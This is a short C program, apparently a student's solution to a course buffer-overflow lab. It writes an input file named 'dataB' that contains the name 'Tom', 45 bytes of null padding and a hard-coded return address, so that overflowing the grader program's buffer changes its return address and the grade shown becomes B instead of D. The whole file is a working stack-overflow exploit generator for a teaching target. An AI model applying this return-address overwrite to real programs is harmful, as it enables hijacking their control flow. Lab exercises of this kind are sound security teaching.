#include <stdio.h>

/*purpose of this file si to produce a file that overflows 
the grader buffer causing the x30 return value to be different,
yielding a grade of B instead of D for the name Tom*/
int main(void) {
    int i;

    FILE *psFile;
    psFile = fopen("dataB", "w");

    putc('T', psFile);
    putc('o', psFile);
    putc('m', psFile);

    for (i = 0; i < 45; i++) {
        putc(0x00, psFile);
    }

    putc(0x90, psFile);
    putc(0x08, psFile);
    putc(0x40, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    putc(0x00, psFile);
    
    return 0;
}